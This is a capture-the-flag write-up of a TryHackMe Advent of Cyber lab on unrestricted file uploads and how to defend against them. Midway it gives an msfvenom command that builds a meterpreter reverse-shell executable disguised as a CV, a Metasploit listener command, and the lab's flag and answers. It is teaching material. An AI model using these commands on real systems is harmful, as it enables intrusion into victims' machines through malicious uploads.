They should’ve coded it more securely! 😈

Welcome to Day 15 of Advent of Cyber 4 (2022) write-up. To check the room, [click here](https://tryhackme.com/room/adventofcyber4).

![](https://miro.medium.com/max/875/1*EMBEYuESJabRf0T7dsCVJA.png)

# [Day 15] Secure Coding Santa is looking for a Sidekick

Today’s task will discuss input validation, its importance, and unrestricted file upload vulnerabilities. We will also learn how a vulnerability due to insecure coding can be dangerous and exploited using the Metasploit tool in practice. Ultimately, we will learn how to implement secure defense techniques to secure our code.

# Learning Objectives

-   Input validation of file upload functionality
-   Unrestricted file upload vulnerabilities
-   Phishing through file uploads
-   How to properly secure file upload functionality

# Input Validation

Insufficient input validation is one of the biggest security concerns for web applications. The issue occurs when the application inherently trusts user-provided input. Since an attacker can also control user input, we can see how this inherent trust can lead to many problems. Several web application vulnerabilities, such as SQL Injection, Cross Site Scripting, and Unrestricted File Upload, stem from the issue of insufficient user input validation. This task will focus on how inadequate input validation can lead to an Unrestricted File Upload vulnerability.

# The Unrestricted File Uploads

The ability to upload files to a server has become integral to interacting with web applications. Just think of file uploads like a profile picture for a social media website, a report being uploaded to cloud storage, or saving a project on GitHub; the applications for file upload features are limitless. Unfortunately, when poorly handled, file uploads can also open up severe vulnerabilities in the server. This can lead to anything from relatively minor nuisance problems; to complete Remote Code Execution (RCE) if an attacker manages to upload and execute a shell. With unrestricted upload access to a server, an attacker could deface or otherwise alter existing content — up to and including injecting malicious webpages, which leads to further vulnerabilities such as Cross-Site Scripting (XSS) or Cross-Site Request Forgery (CSRF).

Unrestricted File Uploads usually have two main exploitation paths:

-   If the attacker can retrieve the uploaded file, it could lead to code execution if the attacker uploads a file such as a web shell.
-   If a user views the file, think of a CV application, then an attacker could embed malware in the uploaded file that would execute on the user’s workstation once they view the file.

To learn more, check out Day 15.

Ready to dive in? Let’s go!

1.  What is the name given to file uploads that allow threat actors to upload any files that they want?

Answer: Unrestricted

2. What is the title of the web application developed by Santa’s freelancer?

Start the machine attached to this task to load the website. Once loaded (roughly 2 minutes), you can navigate to MACHINE_IP to view the website using either the AttackBox or your TryHackMe VPN connection:

![](https://miro.medium.com/max/875/1*25suGwVv73D3eoN6mMoy-g.png)

Answer: SantaSideKick2

3. What is the value of the flag stored in the HR Elf’s Documents directory?

Create a pdf file, and save it.

![](https://miro.medium.com/max/809/1*bSCYJh2LmNO9VjDcA2rSrQ.png)

Now upload this file into the web server by clicking on browse, selecting your pdf file, and then clicking on Upload:

![](https://miro.medium.com/max/875/1*dlo7lEpyZXkp0HGIinP6Ag.png)

We got the following message after uploading the file.

![](https://miro.medium.com/max/875/1*z4dYi4lwZl6o6RvHaHBl4w.png)

Now let’s try uploading an executable file. Change the file type from .pdf to .exe and upload it to the website.

![](https://miro.medium.com/max/383/1*7jEEkhrqYSszhl2oIaFGuQ.png)

Since we got the same result, uploading a malicious file into the server is possible.  
Create a malicious CV using the following command:

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o cv-username.exe

**Note:** Replace tun0 with your machine IP address if you use the Attack Box. (to check your IP, use the ‘ip a’ command)

![](https://miro.medium.com/max/875/1*226Q_jEkEg_2fMJjR6MUyQ.png)

You can then also use the following to create the associated listener in the msfconsole:

sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 4444; exploit"

![](https://miro.medium.com/max/875/1*05VvpH0iuy5a8TplGrM7YA.png)

Once we have our CV, we can upload the file again. Once uploaded, give it a few minutes, and one of those elves should be reviewing our CV (It will take a while, and we have to wait):

![](https://miro.medium.com/max/564/1*C13H4n9ra6m6YP9R7UOYHA.png)

![](https://miro.medium.com/max/875/1*wLIjbE_thpAcRthfvxNULg.png)

Voila! We got access to the server.  
Using the cd command, navigate to C:\\Users\\HR_Elf\\Documents, and then you can find the flag.txt.

![](https://miro.medium.com/max/784/1*kK5TyDxzHHqRw8LF8HZHMQ.png)

Answer: THM{Naughty.File.Uploads.Can.Get.You.RCE}

4. What defense technique can be implemented to ensure that specific file types can be uploaded?

Answer: File Extension Validation

5. What defense technique can be used to make sure the threat actor cannot recover their file again by simply using the file name?

Answer: File Renaming

6. What defense technique can be used to make sure malicious files that can hurt elves are not uploaded?

Answer: Malware Scanning

7. If you want to learn more about vulnerabilities like this one, check out our [Intro to Web Hacking](https://tryhackme.com/module/intro-to-web-hacking) module!

Answer: No answer needed

# Closure

Today we learned the importance of input validation and file upload validation. Also, we learned how unrestricted file upload validation could be exploited using Metasploit. In the end, we discussed securing our code and keeping the website safe.

![](https://miro.medium.com/max/593/1*DAU3GmIo5cKP24HoyKEIJQ.jpeg)

It was a lot of fun today!

I hope you enjoyed the task and walk-through.

> Follow me on LinkedIn:_ [_https://www.linkedin.com/in/nishantverma123/_](https://www.linkedin.com/in/nishantverma123/)

Thank you for reading.